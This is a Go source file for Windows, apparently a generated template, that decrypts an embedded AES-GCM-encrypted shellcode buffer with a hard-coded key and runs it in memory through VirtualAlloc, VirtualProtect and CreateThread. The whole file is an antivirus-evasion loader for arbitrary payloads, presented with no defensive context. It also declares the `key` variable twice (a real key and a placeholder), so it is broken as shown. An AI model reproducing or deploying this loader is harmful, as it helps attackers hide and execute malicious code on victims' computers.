//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Auto-replace markers for key and payload

var buf = []byte { 
	0x1d, 0x27, 0xf6, 0x10, 0xad, 0x3d, 0x30, 0xe3, 0x5d, 0xdd, 0x7f, 0xab, 0x7, 0x76, 0x81, 0xfa, 
	0x8f, 0x5f, 0xe4, 0xc5, 0x90, 0xe9, 0xb2, 0x8, 0x4a, 0x79, 0x26, 0x78, 0xbb, 0xee, 0x5a, 0x2, 
	0x75, 0x64, 0xa, 0xda, 0x3c, 0x53, 0x57, 0x15, 0x79, 0x9a, 0xf5, 0x65, 0xb2, 0xb0, 0xb5, 0x48, 
	0x25, 0x9b, 0x1e, 0xb, 0xa, 0xe1, 0xf5, 0xb7, 0x70, 0xe0, 0x3d, 0x98, 0x31, 0x5, 0xc5, 0xd2, 
	0xe5, 0xf6, 0x3c, 0x4a, 0xfc, 0x2a, 0x74, 0x3e, 0xeb, 0xe3, 0x2, 0xf1, 0x47, 0x73, 0xc, 0x79, 
	0x2f, 0x20, 0xb7, 0xac, 0x7a, 0x9, 0x43, 0xa9, 0x5e, 0xa, 0x6c, 0x87, 0x6d, 0x90, 0xee, 0xce, 
	0x77, 0x83, 0xb2, 0x1a, 0xf2, 0xc1, 0x7b, 0xf9, 0x1b, 0x9c, 0x4, 0x35, 0x42, 0xaf, 0xec, 0x45, 
	0x80, 0xff, 0x7e, 0x93, 0x8e, 0x59, 0xc5, 0x4d, 0xdb, 0x4f, 0xa, 0xdd, 0x25, 0xa1, 0x35, 0x15, 
	0x53, 0xd, 0x2, 0x72, 0x86, 0x9e, 0x5f, 0x1e, 0x4c, 0xfb, 0xa7, 0xfd, 0x93, 0xa8, 0x60, 0x91, 
	0xb3, 0x2a, 0x3e, 0xbb, 0x80, 0x7b, 0xd7, 0xca, 0xaa, 0x89, 0x96, 0x41, 0xb, 0xcd, 0xea, 0xb3, 
	0x6e, 0xd9, 0x49, 0xc8, 0xc6, 0x51, 0xe, 0x8d, 0x92, 0x74, 0x12, 0xcb, 0xe2, 0xa0, 0x10, 0x4e, 
	0xaf, 0xe5, 0xc, 0x36, 0x96, 0x4f, 0xba, 0xc7, 0xa1, 0x77, 0xbc, 0xa, 0xdf, 0xba, 0xe8, 0xaf, 
	0xe1, 0xa, 0x3, 0x28, 0xfe, 0x7a, 0xc4, 0xe0, 0xff, 0x9a, 0x78, 0xe2, 0x88, 0x6d, 0xbe, 0xe3, 
	0x71, 0x59, 0x5d, 0x51, 0x85, 0xda, 0xd9, 0x16, 0xca, 0xf4, 0xaf, 0x8a, 0x82, 0x62, 0x1a, 0xa, 
	0xcf, 0x47, 0xc6, 0xf0, 0xc3, 0x82, 0x53, 0xd6, 0xf, 0x2b, 0xf3, 0x9d, 0xf1, 0x8c, 0x5c, 0x8f, 
	0x8a, 0x56, 0x76, 0x92, 0xc4, 0xf, 0x51, 0x76, 0xa7, 0xc3, 0xf, 0xad, 0xe7, 0xb4, 0x93, 0xb3, 
	0xa3, 0x43, 0x94, 0x2d, 0xeb, 0xeb, 0xa3, 0x1, 0x9a, 0x3, 0x61, 0x45, 0xdd, 0x50, 0x64, 0xb0, 
	0x76, 0xc3, 0xa6, 0x56, 0x4, 0x79, 0x8c, 0xc3, 0x52, 0xf8, 0x9e, 0xff, 0x8d, 0x1a, 0x35, 0xbb, 
	0x85, 0xce, 0x3b, 0x1d, 0x17, 0xc3, 0xf5, 0x89, 0x5f, 0x64, 0x63, 0x21, 0xcb, 0x7d, 0x69, 0x9d} 



var key = []byte { 
	0xf2, 0xc, 0x51, 0x6c, 0x15, 0x3a, 0x33, 0xb2, 0xea, 0x77, 0x5d, 0xa3, 0x5a, 0x36, 0x31, 0x1b, 
	0x35, 0x83, 0x6f, 0x1c, 0x42, 0xdb, 0x40, 0xe5, 0x45, 0x18, 0x8b, 0xa4, 0x49, 0xe3, 0xc7, 0x94} 




var key = []byte{0x00}

func check(err error) {
	if err != nil {
		panic(err)
	}
}

func decryptAES(ciphertext []byte, eKey []byte) (plaintext []byte) {
	c, err := aes.NewCipher(eKey)
	check(err)

	gcm, err := cipher.NewGCM(c)
	check(err)

	nonceSize := gcm.NonceSize()

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err = gcm.Open(nil, nonce, ciphertext, nil)
	check(err)
	return
}

func createThread(sc []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	CreateThread := kernel32.NewProc("CreateThread")

	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), (uintptr)(len(sc)))
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualProtect(): %s", err.Error()))
	}
	thread, _, err := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
	if err.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!] CreateThread(): %s", err.Error()))
	}
	_, _ = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
}

func main() {
	createThread(decryptAES(buf, key))
}